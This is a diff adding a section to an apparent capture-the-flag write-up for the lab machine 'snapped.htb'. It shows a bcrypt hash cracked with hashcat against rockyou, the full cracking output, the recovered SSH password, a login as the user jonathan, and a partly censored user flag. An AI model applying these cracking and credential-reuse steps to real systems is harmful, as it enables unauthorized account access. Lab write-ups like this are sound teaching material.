@@ -198,14 +198,123 @@ COMMIT;
 
 ```
 
-keep only rev
+keep only relevant output. (aka jonatan hash)
 
----
-## User Flag
+Cracking the hash:
 
-### Lateral Movement (if applicable)
+```
+hashcat -m 3200 '$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq'  /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting
 
-Steps to move from initial foothold to user access.
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-haswell-Intel(R) Core(TM) i5-10310U CPU @ 1.70GHz, 1469/2939 MB (512 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory allocated for this attack: 512 MB (990 MB free)
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+Cracking performance lower than expected?                 
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:linkinpark
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2...oCSyWq
+Time.Started.....: Fri Sep 11 11:14:18 2026 (20 secs)
+Time.Estimated...: Fri Sep 11 11:14:38 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:       26 H/s (4.42ms) @ Accel:2 Loops:32 Thr:1 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 504/14344385 (0.00%)
+Rejected.........: 0/504 (0.00%)
+Restore.Point....: 500/14344385 (0.00%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:992-1024
+Candidate.Engine.: Device Generator
+Candidates.#01...: turtle -> claire
+Hardware.Mon.#01.: Util: 97%
+
+Started: Fri Sep 11 11:13:23 2026
+Stopped: Fri Sep 11 11:14:39 2026
+
+```
+
+credentials: `jonathan:linkinpark`
+
+ssh access as jonathan:
+
+```
+ssh jonathan@snapped.htb                           
+The authenticity of host 'snapped.htb (10.129.125.70)' can't be established.
+ED25519 key fingerprint is: SHA256:n0XlQQqHGczclhalpCeoOZDYQGr7rl3WlJytHLWPkr8
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'snapped.htb' (ED25519) to the list of known hosts.
+jonathan@snapped.htb's password: 
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.17.0-19-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+Expanded Security Maintenance for Applications is not enabled.
+
+1 update can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Last login: Fri Mar 20 12:27:50 2026 from 10.10.14.5
+jonathan@snapped:~$ ls
+Desktop  Documents  Downloads  Music  Pictures  Public  snap  Templates  user.txt  Videos
+jonathan@snapped:~$ 
+
+```
+
+```
+jonathan@snapped:~$ cat user.txt
+679f0fb79b998f6e993c37df043fd7e1 cnsor
+```
 
 ---
 ## Privilege Escalation
